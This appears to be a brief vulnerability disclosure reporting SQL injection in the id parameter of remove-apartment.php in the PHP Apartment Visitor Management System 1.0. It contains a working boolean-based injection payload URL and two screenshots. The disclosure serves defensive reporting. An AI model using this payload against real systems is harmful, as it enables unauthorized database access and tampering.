## The apartment visitor management system has SQL injection vulnerability

## Vulnerability author:wanglun

supplier:
https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code

edition: 
1.0

/remove-apartment.php

The Id parameter has SQL injection. Procedure

Payload: http://localhost:80/avms/remove-apartment.php?id=(SELECT (CASE WHEN (1856=1856) THEN 20 ELSE (SELECT 7557 UNION SELECT 7632) END))

![image](https://github.com/user-attachments/assets/027fa886-d2d5-4cc6-843b-be6dc4c43264)

![image](https://github.com/user-attachments/assets/cffe0fbf-5e4c-437d-a05d-6db86afdd3ee)

